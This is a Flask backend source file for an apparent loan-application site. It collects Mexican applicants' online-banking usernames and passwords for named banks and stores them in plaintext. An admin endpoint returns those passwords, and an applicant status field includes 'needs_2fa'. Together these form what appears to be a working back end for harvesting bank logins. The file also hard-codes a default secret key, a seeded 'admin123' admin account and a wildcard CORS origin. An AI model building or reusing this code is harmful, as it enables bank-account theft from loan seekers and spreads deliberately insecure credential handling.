"""
Fixed backend with login issue resolved:
1. Fixed JWT token generation (exp field as int)
2. Better error handling in login
3. All existing functionality preserved
4. Admin password visibility maintained
5. Updated status system maintained
6. Ticket system functionality maintained
"""

import os
import uuid
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
import jwt
from functools import wraps

# Initialize Flask app
app = Flask(__name__)

# Configuration
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///loan_platform.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize extensions
db = SQLAlchemy()
db.init_app(app)

# CORS configuration for Vercel and Railway
CORS(app, origins=[
    'https://malofront.vercel.app',
    'https://*.vercel.app',
    'http://localhost:5173',
    'http://localhost:3000'
])

# Models
class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    role = db.Column(db.String(20), nullable=False, default='applicant')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Profile fields
    first_name = db.Column(db.String(50))
    last_name = db.Column(db.String(50))
    curp = db.Column(db.String(25))
    phone = db.Column(db.String(20))
    
    # Updated status system: pending, approved, needs_2fa
    is_active = db.Column(db.Boolean, default=True)
    status = db.Column(db.String(20), default='pending')
    
    @property
    def name(self):
        try:
            if self.first_name and self.last_name:
                return f"{self.first_name} {self.last_name}"
            return self.email.split('@')[0] if self.email else 'Unknown User'
        except:
            return 'Unknown User'

class BankProvider(db.Model):
    __tablename__ = 'bank_providers'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    name = db.Column(db.String(100), nullable=False)
    code = db.Column(db.String(20), nullable=False, unique=True)
    logo_url = db.Column(db.String(255))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class BankCredential(db.Model):
    __tablename__ = 'bank_credentials'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    user_id = db.Column(db.String(36), db.ForeignKey('users.id'), nullable=False)
    provider_id = db.Column(db.String(36), db.ForeignKey('bank_providers.id'), nullable=False)
    username = db.Column(db.String(255), nullable=False)
    password = db.Column(db.String(255), nullable=False)  # Store password (encrypted in production)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    user = db.relationship('User', backref='bank_credentials')
    provider = db.relationship('BankProvider', backref='credentials')

class Ticket(db.Model):
    __tablename__ = 'tickets'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    title = db.Column(db.String(255), nullable=False)
    description = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(20), default='open')  # open, in_progress, resolved, closed
    priority = db.Column(db.String(20), default='medium')  # low, medium, high, urgent
    category = db.Column(db.String(50), default='general')  # general, technical, billing, support
    
    # User information
    created_by = db.Column(db.String(36), db.ForeignKey('users.id'), nullable=False)
    assigned_to = db.Column(db.String(36), db.ForeignKey('users.id'), nullable=True)
    
    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    resolved_at = db.Column(db.DateTime, nullable=True)
    
    # Relationships
    creator = db.relationship('User', foreign_keys=[created_by], backref='created_tickets')
    assignee = db.relationship('User', foreign_keys=[assigned_to], backref='assigned_tickets')

class AuditLog(db.Model):
    __tablename__ = 'audit_logs'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    user_id = db.Column(db.String(36), db.ForeignKey('users.id'), nullable=False)
    action = db.Column(db.String(100), nullable=False)
    resource_type = db.Column(db.String(50), nullable=False)
    resource_id = db.Column(db.String(36), nullable=True)
    details = db.Column(db.Text, nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relationship
    user = db.relationship('User', backref='audit_logs')

# Authentication decorator
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        
        if 'Authorization' in request.headers:
            auth_header = request.headers['Authorization']
            try:
                token = auth_header.split(" ")[1]
            except IndexError:
                return jsonify({'message': 'Token format invalid'}), 401
        
        if not token:
            return jsonify({'message': 'Token is missing'}), 401
        
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            current_user = User.query.filter_by(id=data['user_id']).first()
            if not current_user:
                return jsonify({'message': 'User not found'}), 401
        except jwt.ExpiredSignatureError:
            return jsonify({'message': 'Token has expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'message': 'Token is invalid'}), 401
        
        return f(current_user, *args, **kwargs)
    
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        
        if 'Authorization' in request.headers:
            auth_header = request.headers['Authorization']
            try:
                token = auth_header.split(" ")[1]
            except IndexError:
                return jsonify({'message': 'Token format invalid'}), 401
        
        if not token:
            return jsonify({'message': 'Token is missing'}), 401
        
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            current_user = User.query.filter_by(id=data['user_id']).first()
            if not current_user or current_user.role != 'admin':
                return jsonify({'message': 'Admin access required'}), 403
        except jwt.ExpiredSignatureError:
            return jsonify({'message': 'Token has expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'message': 'Token is invalid'}), 401
        
        return f(current_user, *args, **kwargs)
    
    return decorated

# Basic Routes
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.utcnow().isoformat(),
        'cors': 'enabled',
        'database': 'connected'
    })

@app.route('/api/test', methods=['GET'])
def test():
    return jsonify({
        'message': 'API is working!',
        'environment': os.environ.get('FLASK_ENV', 'development'),
        'features': ['auth', 'bank_credentials', 'tickets', 'admin_panel']
    })

# Authentication Routes
@app.route('/api/auth/login', methods=['POST', 'OPTIONS'])
def login():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({'message': 'No data provided'}), 400
            
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'message': 'Email and password required'}), 400
        
        # Find user
        user = User.query.filter_by(email=email).first()
        
        if not user:
            return jsonify({'message': 'Invalid credentials'}), 401
        
        # Check password
        if not check_password_hash(user.password_hash, password):
            return jsonify({'message': 'Invalid credentials'}), 401
        
        # ✅ FIXED: Use integer for exp field and proper datetime handling
        expiration_time = datetime.utcnow() + timedelta(hours=24)
        
        token_payload = {
            'user_id': user.id,
            'email': user.email,
            'role': user.role,
            'exp': int(expiration_time.timestamp())  # ✅ Convert to int
        }
        
        token = jwt.encode(token_payload, app.config['SECRET_KEY'], algorithm='HS256')
        
        # ✅ FIXED: Better error handling for user.name property
        try:
            user_name = user.name
        except Exception as e:
            print(f"Error getting user name: {e}")
            user_name = user.email.split('@')[0] if user.email else 'Unknown User'
        
        response_data = {
            'token': token,
            'user': {
                'id': user.id,
                'email': user.email,
                'role': user.role,
                'name': user_name,
                'status': user.status
            }
        }
        
        return jsonify(response_data), 200
        
    except Exception as e:
        print(f"Login error: {str(e)}")
        print(f"Login error type: {type(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({'message': 'Login failed', 'error': str(e)}), 500

@app.route('/api/auth/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json()
        
        # Check if user exists
        if User.query.filter_by(email=data['email']).first():
            return jsonify({'message': 'Email already registered'}), 400
        
        # Create new user
        user = User(
            email=data['email'],
            password_hash=generate_password_hash(data['password']),
            first_name=data.get('first_name', ''),
            last_name=data.get('last_name', ''),
            curp=data.get('curp', ''),
            phone=data.get('phone', ''),
            role='applicant',
            status='pending'
        )
        
        db.session.add(user)
        db.session.commit()
        
        return jsonify({'message': 'User registered successfully'}), 201
    
    except Exception as e:
        print(f"Registration error: {e}")
        return jsonify({'message': 'Registration failed'}), 500

# Bank Provider Routes
@app.route('/api/applicants/banks', methods=['GET'])
def get_banks():
    try:
        banks = BankProvider.query.all()
        return jsonify({
            'banks': [{
                'id': bank.id,
                'name': bank.name,
                'code': bank.code,
                'logo_url': bank.logo_url
            } for bank in banks]
        })
    except Exception as e:
        print(f"Error getting banks: {e}")
        return jsonify({'message': 'Error retrieving banks'}), 500

# User Credentials Routes
@app.route('/api/applicants/credentials', methods=['GET'])
@token_required
def get_user_credentials(current_user):
    try:
        credentials = BankCredential.query.filter_by(user_id=current_user.id).all()
        
        result = []
        for cred in credentials:
            result.append({
                'id': cred.id,
                'provider_id': cred.provider_id,
                'provider_name': cred.provider.name,
                'provider_code': cred.provider.code,
                'username': cred.username,
                # Don't return password for regular users
                'created_at': cred.created_at.isoformat()
            })
        
        return jsonify(result)
    except Exception as e:
        print(f"Error getting credentials: {e}")
        return jsonify({'message': 'Error retrieving credentials'}), 500

@app.route('/api/applicants/credentials', methods=['POST'])
@token_required
def save_credentials(current_user):
    try:
        data = request.get_json()
        
        # Check if credentials already exist for this provider
        existing = BankCredential.query.filter_by(
            user_id=current_user.id,
            provider_id=data['provider_id']
        ).first()
        
        if existing:
            # Update existing credentials
            existing.username = data['username']
            existing.password = data['password']  # In production, encrypt this
            existing.updated_at = datetime.utcnow()
        else:
            # Create new credentials
            credential = BankCredential(
                user_id=current_user.id,
                provider_id=data['provider_id'],
                username=data['username'],
                password=data['password']  # In production, encrypt this
            )
            db.session.add(credential)
        
        db.session.commit()
        
        return jsonify({'message': 'Credentials saved successfully'}), 201
    except Exception as e:
        print(f"Error saving credentials: {e}")
        return jsonify({'message': 'Error saving credentials'}), 500

@app.route('/api/applicants/credentials/<credential_id>', methods=['DELETE'])
@token_required
def delete_credential(current_user, credential_id):
    try:
        credential = BankCredential.query.filter_by(
            id=credential_id,
            user_id=current_user.id
        ).first()
        
        if not credential:
            return jsonify({'message': 'Credential not found'}), 404
        
        db.session.delete(credential)
        db.session.commit()
        
        return jsonify({'message': 'Credential deleted successfully'})
    except Exception as e:
        print(f"Error deleting credential: {e}")
        return jsonify({'message': 'Error deleting credential'}), 500

# Admin Routes
@app.route('/api/admin/applicants', methods=['GET'])
@admin_required
def get_applicants(current_user):
    try:
        applicants = User.query.filter_by(role='applicant').all()
        
        result = []
        for applicant in applicants:
            try:
                applicant_name = applicant.name
            except:
                applicant_name = applicant.email.split('@')[0] if applicant.email else 'Unknown'
                
            result.append({
                'id': applicant.id,
                'email': applicant.email,
                'name': applicant_name,
                'curp': applicant.curp,
                'phone': applicant.phone,
                'status': applicant.status,
                'is_active': applicant.is_active,
                'created_at': applicant.created_at.isoformat()
            })
        
        return jsonify({'applicants': result})
    except Exception as e:
        print(f"Error getting applicants: {e}")
        return jsonify({'message': 'Error retrieving applicants'}), 500

# ✅ ADMIN PASSWORD VISIBILITY - Returns passwords for admin users
@app.route('/api/admin/applicants/<applicant_id>/credentials', methods=['GET'])
@admin_required
def get_applicant_credentials(current_user, applicant_id):
    try:
        # Get applicant info
        applicant = User.query.filter_by(id=applicant_id).first()
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        # Get credentials
        credentials = BankCredential.query.filter_by(user_id=applicant_id).all()
        
        try:
            applicant_name = applicant.name
        except:
            applicant_name = applicant.email.split('@')[0] if applicant.email else 'Unknown'
        
        result = {
            'applicant': {
                'id': applicant.id,
                'name': applicant_name,
                'email': applicant.email
            },
            'credentials': []
        }
        
        for cred in credentials:
            result['credentials'].append({
                'id': cred.id,
                'provider_id': cred.provider_id,
                'provider_name': cred.provider.name,
                'provider_code': cred.provider.code,
                'username': cred.username,
                'password': cred.password,  # ✅ PASSWORD VISIBLE FOR ADMIN
                'created_at': cred.created_at.isoformat()
            })
        
        return jsonify(result)
    except Exception as e:
        print(f"Error getting applicant credentials: {e}")
        return jsonify({'message': 'Error retrieving credentials'}), 500

# ✅ UPDATED STATUS SYSTEM - Supports pending, approved, needs_2fa
@app.route('/api/admin/applicants/<applicant_id>/status', methods=['PUT'])
@admin_required
def update_applicant_status(current_user, applicant_id):
    try:
        data = request.get_json()
        new_status = data.get('status')
        
        # Validate status
        valid_statuses = ['pending', 'approved', 'needs_2fa']
        if new_status not in valid_statuses:
            return jsonify({'message': f'Invalid status. Must be one of: {", ".join(valid_statuses)}'}), 400
        
        applicant = User.query.filter_by(id=applicant_id).first()
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        old_status = applicant.status
        applicant.status = new_status
        db.session.commit()
        
        # Log the action
        audit_log = AuditLog(
            user_id=current_user.id,
            action='status_update',
            resource_type='user',
            resource_id=applicant_id,
            details=f'Status changed from {old_status} to {new_status}'
        )
        db.session.add(audit_log)
        db.session.commit()
        
        return jsonify({
            'message': 'Status updated successfully',
            'old_status': old_status,
            'new_status': new_status
        })
    except Exception as e:
        print(f"Error updating status: {e}")
        return jsonify({'message': 'Error updating status'}), 500

# ✅ TICKET SYSTEM - Full CRUD functionality
@app.route('/api/tickets', methods=['GET'])
@token_required
def get_tickets(current_user):
    try:
        if current_user.role == 'admin':
            # Admin sees all tickets
            tickets = Ticket.query.all()
        else:
            # Users see only their tickets
            tickets = Ticket.query.filter_by(created_by=current_user.id).all()
        
        result = []
        for ticket in tickets:
            try:
                creator_name = ticket.creator.name if ticket.creator else 'Unknown'
            except:
                creator_name = 'Unknown'
                
            try:
                assignee_name = ticket.assignee.name if ticket.assignee else None
            except:
                assignee_name = None
            
            result.append({
                'id': ticket.id,
                'title': ticket.title,
                'description': ticket.description,
                'status': ticket.status,
                'priority': ticket.priority,
                'category': ticket.category,
                'created_by': ticket.created_by,
                'creator_name': creator_name,
                'assigned_to': ticket.assigned_to,
                'assignee_name': assignee_name,
                'created_at': ticket.created_at.isoformat(),
                'updated_at': ticket.updated_at.isoformat(),
                'resolved_at': ticket.resolved_at.isoformat() if ticket.resolved_at else None
            })
        
        return jsonify({'tickets': result})
    except Exception as e:
        print(f"Error getting tickets: {e}")
        return jsonify({'message': 'Error retrieving tickets'}), 500

@app.route('/api/tickets', methods=['POST'])
@token_required
def create_ticket(current_user):
    try:
        data = request.get_json()
        
        ticket = Ticket(
            title=data['title'],
            description=data['description'],
            priority=data.get('priority', 'medium'),
            category=data.get('category', 'general'),
            created_by=current_user.id,
            assigned_to=data.get('assigned_to')
        )
        
        db.session.add(ticket)
        db.session.commit()
        
        return jsonify({
            'message': 'Ticket created successfully',
            'ticket_id': ticket.id
        }), 201
    except Exception as e:
        print(f"Error creating ticket: {e}")
        return jsonify({'message': 'Error creating ticket'}), 500

@app.route('/api/tickets/<ticket_id>', methods=['GET'])
@token_required
def get_ticket(current_user, ticket_id):
    try:
        ticket = Ticket.query.filter_by(id=ticket_id).first()
        
        if not ticket:
            return jsonify({'message': 'Ticket not found'}), 404
        
        # Check permissions
        if current_user.role != 'admin' and ticket.created_by != current_user.id:
            return jsonify({'message': 'Access denied'}), 403
        
        try:
            creator_name = ticket.creator.name if ticket.creator else 'Unknown'
        except:
            creator_name = 'Unknown'
            
        try:
            assignee_name = ticket.assignee.name if ticket.assignee else None
        except:
            assignee_name = None
        
        result = {
            'id': ticket.id,
            'title': ticket.title,
            'description': ticket.description,
            'status': ticket.status,
            'priority': ticket.priority,
            'category': ticket.category,
            'created_by': ticket.created_by,
            'creator_name': creator_name,
            'assigned_to': ticket.assigned_to,
            'assignee_name': assignee_name,
            'created_at': ticket.created_at.isoformat(),
            'updated_at': ticket.updated_at.isoformat(),
            'resolved_at': ticket.resolved_at.isoformat() if ticket.resolved_at else None
        }
        
        return jsonify(result)
    except Exception as e:
        print(f"Error getting ticket: {e}")
        return jsonify({'message': 'Error retrieving ticket'}), 500

@app.route('/api/tickets/<ticket_id>', methods=['PUT'])
@token_required
def update_ticket(current_user, ticket_id):
    try:
        ticket = Ticket.query.filter_by(id=ticket_id).first()
        
        if not ticket:
            return jsonify({'message': 'Ticket not found'}), 404
        
        # Check permissions
        if current_user.role != 'admin' and ticket.created_by != current_user.id:
            return jsonify({'message': 'Access denied'}), 403
        
        data = request.get_json()
        
        # Update fields
        if 'title' in data:
            ticket.title = data['title']
        if 'description' in data:
            ticket.description = data['description']
        if 'status' in data:
            ticket.status = data['status']
            if data['status'] == 'resolved':
                ticket.resolved_at = datetime.utcnow()
        if 'priority' in data:
            ticket.priority = data['priority']
        if 'category' in data:
            ticket.category = data['category']
        if 'assigned_to' in data:
            ticket.assigned_to = data['assigned_to']
        
        ticket.updated_at = datetime.utcnow()
        db.session.commit()
        
        return jsonify({'message': 'Ticket updated successfully'})
    except Exception as e:
        print(f"Error updating ticket: {e}")
        return jsonify({'message': 'Error updating ticket'}), 500

@app.route('/api/tickets/<ticket_id>', methods=['DELETE'])
@token_required
def delete_ticket(current_user, ticket_id):
    try:
        ticket = Ticket.query.filter_by(id=ticket_id).first()
        
        if not ticket:
            return jsonify({'message': 'Ticket not found'}), 404
        
        # Check permissions (only admin or creator can delete)
        if current_user.role != 'admin' and ticket.created_by != current_user.id:
            return jsonify({'message': 'Access denied'}), 403
        
        db.session.delete(ticket)
        db.session.commit()
        
        return jsonify({'message': 'Ticket deleted successfully'})
    except Exception as e:
        print(f"Error deleting ticket: {e}")
        return jsonify({'message': 'Error deleting ticket'}), 500

# Database initialization
def init_database():
    """Initialize database with tables and seed data"""
    try:
        with app.app_context():
            # Create all tables
            db.create_all()
            
            # Check if we need to seed data
            if User.query.count() == 0:
                print("Seeding database with initial data...")
                
                # Create admin user
                admin_user = User(
                    email='admin@loanplatform.com',
                    password_hash=generate_password_hash('admin123'),
                    first_name='Admin',
                    last_name='User',
                    role='admin',
                    status='approved'
                )
                db.session.add(admin_user)
                
                # Create test applicant
                test_user = User(
                    email='juan@socopwa.com',
                    password_hash=generate_password_hash('test123'),
                    first_name='Juan',
                    last_name='Cordero',
                    curp='CORJ850315HDFXXX01',
                    phone='+52 55 1234 5678',
                    role='applicant',
                    status='pending'
                )
                db.session.add(test_user)
                
                # Create bank providers
                banks = [
                    {'name': 'BBVA México', 'code': 'BBVA', 'logo_url': '/assets/bbva-logo.jpg'},
                    {'name': 'Santander México', 'code': 'SANTANDER', 'logo_url': '/assets/santander-logo.jpg'},
                    {'name': 'Banamex', 'code': 'BANAMEX', 'logo_url': '/assets/banamex-logo.jpg'},
                    {'name': 'Banorte', 'code': 'BANORTE', 'logo_url': '/assets/banorte-logo.jpg'},
                    {'name': 'HSBC México', 'code': 'HSBC', 'logo_url': '/assets/hsbc-logo.jpg'},
                    {'name': 'Banco Azteca', 'code': 'AZTECA', 'logo_url': '/assets/azteca-logo.jpg'}
                ]
                
                for bank_data in banks:
                    bank = BankProvider(**bank_data)
                    db.session.add(bank)
                
                db.session.commit()
                print("Database seeded successfully!")
            else:
                print("Database already contains data, skipping seed.")
                
    except Exception as e:
        print(f"Error initializing database: {e}")
        import traceback
        traceback.print_exc()

# Initialize database when app starts
init_database()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

